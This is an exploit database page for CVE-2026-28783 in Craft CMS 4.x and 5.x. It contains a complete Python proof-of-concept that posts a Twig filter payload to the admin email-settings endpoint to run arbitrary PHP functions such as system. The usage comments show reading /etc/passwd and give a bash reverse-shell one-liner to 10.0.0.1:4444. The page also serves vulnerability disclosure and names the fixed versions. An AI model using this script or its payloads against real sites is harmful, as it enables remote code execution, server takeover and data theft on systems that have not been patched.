---
title: Craft CMS 4.x & 5.x  RCE via Blocklist Bypass
url: https://cxsecurity.com/issue/WLB-2026030012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-08
fetch_date: 2026-03-09T04:08:03.939668
---

# Craft CMS 4.x & 5.x  RCE via Blocklist Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Craft CMS 4.x & 5.x RCE via Blocklist Bypass** **2026.03.08**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-28783](https://cxsecurity.com/cveshow/CVE-2026-28783/ "Click to see CVE-2026-28783")**  CWE: **[CWE-94 (Improper Control of Generation of Code / Code Injection), CWE-184 (Incomplete List of Disallowed Inputs), CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine)](https://cxsecurity.com/cwe/CWE-94%20%28Improper%20Control%20of%20Generation%20of%20Code%20/%20Code%20Injection%29%2C%20CWE-184%20%28Incomplete%20List%20of%20Disallowed%20Inputs%29%2C%20CWE-1336%20%28Improper%20Neutralization%20of%20Special%20Elements%20Used%20in%20a%20Template%20Engine%29 "Click to see CWE-94 (Improper Control of Generation of Code / Code Injection), CWE-184 (Incomplete List of Disallowed Inputs), CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine)")** | |

#!/usr/bin/env python3
# Exploit Title: Craft CMS 4.x & 5.x RCE via Blocklist Bypass
# CVE: CVE-2026-28783
# Date: 2025-11-15
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://craftcms.com
# Software Link: https://github.com/craftcms/cms
# Affected: Craft CMS 4.0.0-RC1 to 4.17.0-beta.1 / 5.0.0-RC1 to 5.9.0-beta.1
# Tested on: Craft CMS 4.x & 5.x (vulnerable versions)
# Category: Remote Code Execution
# Platform: PHP / Craft CMS
# Exploit Type: Authenticated (admin/editor Twig template access)
# CVSS: 8.8 (High) [Estimated]
# CWE: CWE-94, CWE-184, CWE-1336
# Description: Craft CMS allowed arbitrary PHP function execution via Twig filters
# using non-closure arrow function syntax due to an incomplete blocklist.
# Fixed in: Craft CMS 4.17.0 / 5.9.0 (Twig sandbox enforcement)
# Usage:
# python3 exploit.py <target\_url> --cookie <session\_cookie> --cmd "<command>" --func <php\_function>
#
# Examples:
# python3 exploit.py http://craft.target.com --cookie "abc123..." --cmd "id"
# python3 exploit.py http://craft.target.com --cookie "xyz..." --cmd "whoami" --func passthru
# python3 exploit.py http://craft.target.com --cookie "abc..." --cmd "/etc/passwd" --func file\_get\_contents
#
# Options:
# --cookie CraftSessionId value from authenticated admin session
# --cmd Command or argument to pass to the PHP function
# --func PHP function to call (system, passthru, exec, file\_get\_contents, etc.)
#
# Notes:
# - Requires authenticated access to edit Twig-enabled templates (System Messages, email templates, custom fields).
# - Not unauthenticated / blind RCE — needs valid admin/editor privileges.
# - For reverse shell: --cmd "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'" --func system
#
# How to Use
#
# Step 1: Log in to Craft CMS admin panel as an administrator or editor with Twig template edit permissions
# Step 2: Copy your CraftSessionId cookie from browser dev tools (Application → Cookies)
# Step 3: Run the exploit with the target URL and your session cookie
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-28783 • Craft CMS Twig RCE via Blocklist Bypass ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import requests
import argparse
import sys
def exploit\_craft\_twig\_rce(target\_url, session\_cookie, command, function):
save\_endpoint = f"{target\_url.rstrip('/')}/admin/settings/email/save-message"
twig\_payload = (
f"{{{{ ['{command.replace("'", "\\'")}'] | map('{function}') | join }}}}"
)
data = {
"id": "1",
"name": "Contact Form",
"subject": "Test Subject",
"body": twig\_payload,
}
headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
"Referer": f"{target\_url}/admin/settings/email",
}
cookies = {"CraftSessionId": session\_cookie}
print(f"[\*] Target: {save\_endpoint}")
print(f"[\*] Payload:\n {twig\_payload}")
print(f"[\*] Calling PHP::{function}('{command}')\n")
try:
response = requests.post(
save\_endpoint,
data=data,
headers=headers,
cookies=cookies,
allow\_redirects=False,
timeout=15
)
print(f"[+] Status: {response.status\_code}")
if response.status\_code in (200, 302):
print("[+] Payload delivered successfully!")
print(" → Trigger by sending a test email or rendering the template.")
print(" → Check output / server logs for result.")
else:
print(f"[-] Failed: {response.status\_code} - {response.text[:300]}...")
except requests.RequestException as e:
print(f"[-] Error: {e}")
if \_\_name\_\_ == "\_\_main\_\_":
parser = argparse.ArgumentParser(
description="CVE-2026-28783 Craft CMS Twig Blocklist Bypass → RCE PoC"
)
parser.add\_argument("url", help="Craft CMS base URL[](http://target.com)")
parser.add\_argument("--cookie", required=True, help="CraftSessionId cookie value")
parser.add\_argument("--cmd", default="id", help="Command/argument to execute")
parser.add\_argument("--func", default="system", help="PHP function (system/passthru/file\_get\_contents/...)")
args = parser.parse\_args()
exploit\_craft\_twig\_rce(
target\_url=args.url,
session\_cookie=args.cookie,
command=args.cmd,
function=args.func
)

**##### References:**

https://github.com/craftcms/cms/security/advisories/GHSA-5fvc-7894-ghp4

https://github.com/craftcms/cms/pull/18208

https://nvd.nist.gov/vuln/detail/CVE-2026-28783

https://www.tenable.com/cve/CVE-2026-28783

[**See this note in RAW Version**](https://cxsecurity.c...